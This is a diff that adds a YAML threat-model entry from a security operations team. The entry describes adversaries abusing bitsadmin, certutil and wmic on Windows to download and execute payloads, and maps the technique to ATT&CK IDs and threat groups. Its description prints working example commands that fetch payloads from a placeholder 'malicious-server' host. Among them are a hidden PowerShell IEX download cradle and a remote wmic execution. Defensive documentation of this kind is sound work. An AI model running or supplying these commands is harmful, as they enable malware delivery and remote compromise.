@@ -1,0 +1,79 @@
+name: Download and Execute Payloads with Windows Utilities
+criticality: Medium
+metadata:
+  uuid: 765be5d9-4f79-4e3d-b894-fa428f285ab5
+  schema: threat::1.0
+  version: 1
+  created: 2024-11-05
+  modified: 2024-11-05
+  tlp: clear
+  organisation:
+    uuid: 56b0a0f0-b0bc-47d9-bb46-02f80ae2065a
+    name: EC DIGIT CSOC
+threat:
+  actors:
+    - att&ck::G0046
+    - misp::00220228-a5a4-4032-a30d-826bb55aa3fb
+    - att&ck::G0010
+    - misp::fa80877c-f509-4daf-8b62-20aba1635f68
+    - att&ck::G0016
+    - misp::2ee5ed7a-c4d0-40be-a837-20817474a15b
+  killchain: Execution
+  att&ck:
+    - T1105
+    - T1218
+  chaining:
+    - relation: atomicity::implements
+      vector: d5039f2c-9fcc-4ba3-ad6a-da8c891ba745
+      description: |-
+        This TVM is implementing the bigger TVM : Abuse of Windows Utilities
+  terrain: |-
+    Adversary has access to a Windows system where native utilities are available 
+    and can execute commands without restrictions.
+
+    Domains: Enterprise
+    Targets: Workstations, Public-Facing Servers, Laptop, Virtual Machines
+    Platforms: Windows, PowerShell
+  severity: Significant incident
+  leverage: Elevation of privilege; Software installation; Information Disclosure; Modify configuration
+  impact: Data Breach; Reputational Damages; Business disruption
+  viability: Likely
+  description: |-
+    1. Bitsadmin.exe\
+    **Description**: A command-line tool to create and manage BITS jobs. 
+    Threat actors use it to download or upload files stealthily.
+
+    Example:
+
+    ```
+    bitsadmin.exe /transfer myJob /download /priority high http://malicious-server/payload.exe C:\temp\payload.exe
+    start C:\temp\payload.exe
+    ```
+
+    2. Certutil.exe\
+    **Description**: A command-line tool for manipulating certificates. 
+    It can be used to download files and perform Base64 encoding/decoding.
+
+    Example:
+
+    ```
+    certutil.exe -urlcache -split -f http://malicious-server/payload.exe C:\temp\payload.exe
+    ```
+
+    3. Wmic.exe\
+    **Description**: Windows Management Instrumentation Command-line (WMIC) is 
+    a command-line utility that provides a powerful interface to the 
+    Windows Management Instrumentation (WMI) infrastructure. 
+    It allows administrators to perform management tasks on both local and remote Windows systems
+
+    Example:
+
+    Execute payload on a local machine:
+    ```
+    wmic process call create "powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command \"IEX(New-Object Net.WebClient).DownloadString('http://malicious-server/payload.ps1')\""
+    ```
+
+    Execute a remote script:
+    ```
+    wmic /node:"REMOTE_COMPUTER_NAME" process call create "powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command \"Invoke-WebRequest -Uri 'http://malicious-server/payload.exe' -OutFile 'C:\\Windows\\Temp\\payload.exe'; Start-Process 'C:\\Windows\\Temp\\payload.exe'\""
+    ```
